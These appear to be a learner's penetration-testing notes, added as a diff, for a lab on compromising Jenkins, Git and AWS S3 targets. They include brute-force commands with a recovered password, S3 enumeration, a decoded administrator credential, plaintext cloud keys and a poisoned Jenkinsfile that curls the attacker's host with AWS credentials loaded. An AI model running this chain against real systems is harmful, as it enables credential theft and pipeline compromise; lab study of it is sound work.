@@ -1120,3 +1120,155 @@ exploit -j
 
 
 python2 50999.py 192.168.102.213 20000
+
+
+AWS
+dns ip: 44.205.248.174
+kali ip: 44.201.58.219
+kali pass: Ks8IaSyQLKNqRZq1
+access key id: AKIAWIQVKDEGELC6CBKB
+secret access key: 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
+
+sudo nmcli connection modify "Wired connection 1" ipv4.dns "44.205.248.174"
+sudo systemctl restart NetworkManager
+cat /etc/resolv.conf
+nslookup git.offseclab.io
+    Server:         44.205.248.174
+    Address:        44.205.248.174#53
+
+    Non-authoritative answer:
+    Name:   git.offseclab.io
+    Address: 44.203.135.216
+
+
+sudo msfdb init
+
+msfconsole --quiet
+use auxiliary/scanner/http/jenkins_enum
+show options
+set RHOSTS automation.offseclab.io
+set TARGETURI /
+run
+
+feroxbuster -u http://automation.offseclab.io/ - w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://automation.offseclab.io/ -w /usr/share/wordlists/dirb/common.txt -b 403
+
+/assets               (Status: 302) [Size: 0] [--> http://automation.offseclab.io/assets/]
+/error                (Status: 400) [Size: 9503]
+/favicon.ico          (Status: 200) [Size: 17542]
+/git                  (Status: 302) [Size: 0] [--> http://automation.offseclab.io/git/]
+/help_answer          (Status: 200) [Size: 44]                                                       THIS ONE
+/login                (Status: 200) [Size: 1570]
+/logout               (Status: 302) [Size: 0] [--> http://automation.offseclab.io/]
+/META-INF             (Status: 404) [Size: 449]
+/meta-inf             (Status: 404) [Size: 449]
+/robots.txt           (Status: 200) [Size: 71]
+/signup               (Status: 404) [Size: 6774]
+/WEB-INF              (Status: 404) [Size: 448]
+/web-inf              (Status: 404) [Size: 448]
+
+
+
+
+Brute force the users discovered in the SCM server and find the user with a weak password. What is that user's password?
+The fuzzing endpoint should be http://git.offseclab.io/api/v1/user.
+Try brute forcing Billy with any web application brute force tool.
+these are all the users Billy, Jack, Lucy, Roger, and administrator (but based on the hint it is billy)
+
+ffuf -w /usr/share/wordlists/rockyou.txt \
+     -X POST \
+     -d "username=billy&password=FUZZ" \
+     -u http://git.offseclab.io/api/v1/user \
+     -mc all \
+     -fc 401,403,404 \
+     -t 50 \
+     -H "Content-Type: application/x-www-form-urlencoded"
+
+wfuzz -z file,/usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt --basic "Billy:FUZZ" http://git.offseclab.io/api/v1/user
+
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2020-200_most_used_passwords.txt
+
+
+wfuzz worked, Billy : qwerty
+
+
+
+
+dirb http://app.offseclab.io
+
+curl https://staticcontent-3m3bwogxkg6xz8nq.s3.us-east-1.amazonaws.com
+
+https://staticcontent-3m3bwogxkg6xz8nq.s3.us-east-1.amazonaws.com/images/bunny.jpg
+
+aws configure
+
+aws s3 ls staticcontent-3m3bwogxkg6xz8nq
+                           PRE .git/
+                           PRE images/
+                           PRE scripts/
+                           PRE webroot/
+2025-07-08 00:39:17        972 CONTRIBUTING.md
+2025-07-08 00:39:16         79 Caddyfile
+2025-07-08 00:39:16        407 Jenkinsfile
+2025-07-08 00:39:17        879 README.md
+2025-07-08 00:39:17        176 docker-compose.yml
+
+aws s3 ls s3://staticcontent-3m3bwogxkg6xz8nq/webroot/
+aws s3 cp s3://staticcontent-3m3bwogxkg6xz8nq/webroot/index.html .
+
+//downloads the index.html 
+
+
+aws s3 cp s3://staticcontent-3m3bwogxkg6xz8nq/README.md ./
+
+mkdir static_content
+
+aws s3 sync s3://staticcontent-3m3bwogxkg6xz8nq ./static_content/
+
+
+FIX APT INSTALL
+curl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/kali-archive-keyring.gpg
+sudo apt update
+sudo apt --fix-broken install
+sudo dpkg --configure -a
+
+
+git log
+git show a2028c4dca191ece9654959a25e21743baf98e68
+echo "YWRtaW5pc3RyYXRvcjpnd2w1d2U1bTc0dXU3YWFt" | base64 --decode
+administrator:gwl5we5m74uu7aam
+
+// find flag in history
+git grep -I -i "OS{" $(git rev-list --all)
+
+git.offseclab.io
+
+login above
+
+edit jenkinsfile in image-transform
+
+pipeline {
+  agent any
+  stages {
+    stage('Build') {
+      steps {
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'curl http://44.201.58.219/unix'
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+AWS
+dns ip: 44.205.248.174
+kali ip: 44.201.58.219
+kali pass: Ks8IaSyQLKNqRZq1
+access key id: AKIAWIQVKDEGELC6CBKB
+secret access key: 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
+
+ssh kali@44.201.58.219
